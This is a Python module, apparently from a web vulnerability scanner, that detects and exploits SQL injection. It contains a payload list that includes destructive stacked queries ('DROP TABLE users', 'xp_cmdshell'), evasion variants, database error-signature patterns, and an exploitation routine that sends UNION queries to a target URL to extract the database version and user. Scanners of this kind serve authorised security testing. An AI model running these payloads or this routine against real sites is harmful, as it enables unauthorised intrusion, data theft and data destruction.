"""
SQL Injection Context Implementation

Refactored SQL injection detection logic using the generalized framework.
"""

import re
from typing import List, Dict, Any, Tuple, Optional
from .base import InjectionContext, InjectionContextType


class SQLInjectionContext(InjectionContext):
    """
    SQL injection attack context.
    Detects and exploits SQL injection vulnerabilities.
    """
    
    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.SQL
    
    def _load_payloads(self) -> List[str]:
        """Load SQL injection payloads."""
        return [
            # Error-based payloads
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "' AND '1'='2",
            "1' AND '1'='1",
            "admin'--",
            "admin' #",
            "' OR 'x'='x",
            "') OR ('x')=('x",
            
            # UNION-based payloads
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL--",
            
            # Boolean-based blind payloads
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND SUBSTRING(@@version,1,1)='5",
            
            # Time-based blind payloads
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; SELECT SLEEP(5)--",
            "'; EXEC xp_cmdshell('whoami')--",
            
            # Advanced evasion
            "' /**/OR/**/ '1'='1",
            "' /*!50000OR*/ '1'='1",
            "' %6F%72 '1'='1",  # Encoded OR
            "' || '1'='1",
            "' && '1'='1",
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load SQL error patterns for detection."""
        return [
            # MySQL errors
            {'pattern': r'You have an error in your SQL syntax', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'mysql_fetch', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'mysql_query', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*mysql_.*', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'MySQL server version', 'type': 'error', 'confidence': 0.95},
            
            # PostgreSQL errors
            {'pattern': r'PostgreSQL.*ERROR', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'pg_query', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*pg_.*', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'invalid input syntax', 'type': 'error', 'confidence': 0.90},
            
            # Microsoft SQL Server errors
            {'pattern': r'Microsoft SQL Native Client error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'ODBC SQL Server Driver', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'SQLServer JDBC Driver', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Unclosed quotation mark', 'type': 'error', 'confidence': 0.90},
            
            # Oracle errors
            {'pattern': r'ORA-[0-9]{5}', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Oracle.*Driver', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*oci_.*', 'type': 'error', 'confidence': 0.90},
            
            # SQLite errors
            {'pattern': r'SQLite.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'sqlite3\.', 'type': 'error', 'confidence': 0.90},
            
            # Generic SQL errors
            {'pattern': r'SQL syntax.*error', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'syntax error.*SQL', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'unexpected.*SQL', 'type': 'error', 'confidence': 0.80},
        ]
    
    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None
    ) -> Tuple[bool, float, str]:
        """
        Analyze response for SQL injection indicators.
        """
        # Check for error-based detection
        for pattern_info in self.detection_patterns:
            pattern = pattern_info['pattern']
            if re.search(pattern, response_body, re.IGNORECASE):
                evidence = f"SQL error pattern detected: {pattern}"
                return True, pattern_info['confidence'], evidence
        
        # Check for time-based detection
        if baseline_time and response_time > baseline_time + 4.5:
            evidence = f"Time-based SQL injection detected (response time: {response_time:.2f}s vs baseline: {baseline_time:.2f}s)"
            return True, 0.85, evidence
        
        # Check for boolean-based detection indicators
        if self._check_boolean_indicators(response_body):
            evidence = "Boolean-based SQL injection indicators detected"
            return True, 0.75, evidence
        
        return False, 0.0, "No SQL injection detected"
    
    def _check_boolean_indicators(self, response_body: str) -> bool:
        """Check for boolean-based injection indicators."""
        # Look for significant changes that might indicate boolean injection
        # This is a simplified check; real implementation would compare with baseline
        indicators = [
            r'login.*successful',
            r'welcome.*admin',
            r'access.*granted',
        ]
        
        for indicator in indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit SQL injection to extract data.
        """
        import requests
        
        exploitation_results = {
            'database_type': None,
            'database_version': None,
            'current_user': None,
            'current_database': None,
            'tables': [],
            'sample_data': {}
        }
        
        # Try to extract database version
        version_payloads = [
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT banner FROM v$version--",
        ]
        
        for payload in version_payloads:
            try:
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: payload},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: payload},
                        timeout=10
                    )
                
                # Look for version information in response
                version_patterns = [
                    r'MySQL.*(\d+\.\d+\.\d+)',
                    r'PostgreSQL.*(\d+\.\d+)',
                    r'Microsoft SQL Server.*(\d+)',
                    r'Oracle.*(\d+)',
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        exploitation_results['database_version'] = match.group(0)
                        exploitation_results['database_type'] = pattern.split('.*')[0]
                        break
                
                if exploitation_results['database_version']:
                    break
                    
            except requests.RequestException:
                continue
        
        # Try to extract current user
        user_payloads = [
            "' UNION SELECT user()--",
            "' UNION SELECT current_user--",
            "' UNION SELECT USER_NAME()--",
        ]
        
        for payload in user_payloads:
            try:
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: payload},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: payload},
                        timeout=10
                    )
                
                # Look for user information
                user_patterns = [r'([a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+)', r'(root|admin|sa|postgres)']
                
                for pattern in user_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        exploitation_results['current_user'] = match.group(1)
                        break
                
                if exploitation_results['current_user']:
                    break
                    
            except requests.RequestException:
                continue
        
        return exploitation_results if any(exploitation_results.values()) else None
    
    def get_description(self) -> str:
        return "SQL Injection - Tests for vulnerabilities in SQL database queries"
